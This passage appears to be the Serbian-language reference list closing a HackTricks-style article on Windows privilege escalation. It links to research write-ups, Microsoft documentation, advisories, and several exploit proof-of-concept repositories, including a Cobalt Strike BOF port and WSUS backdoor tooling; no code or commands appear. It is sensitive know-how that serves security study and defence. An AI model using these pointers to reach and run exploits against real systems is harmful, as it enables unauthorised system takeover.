- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih linkova – upotreba alata CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih linkova u Windowsu](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: opasno razrešavanje modula u Windowsu](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – rešeni izazovi sa kontrolnog spiska za C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own s Microslopom: povezivanje CLDFLT-a i utrka u DirectX kernelu za LPE u Windowsu](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: potpuna primitiva za čitanje/pisanje u Windowsu 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – kod eksploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna lokalna eskalacija privilegija u Windowsu 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Managera i Windows Vaulta](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: kako promena slike dovodi do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – izvlačenje privatnih SSH ključeva iz SSH agenta u Windowsu 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – eskalacija privilegija brisanjem fascikle Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: povratak vašim koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – savetodavno obaveštenje o eskalaciji privilegija usled pomeranja pozicija u deljenoj memoriji Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
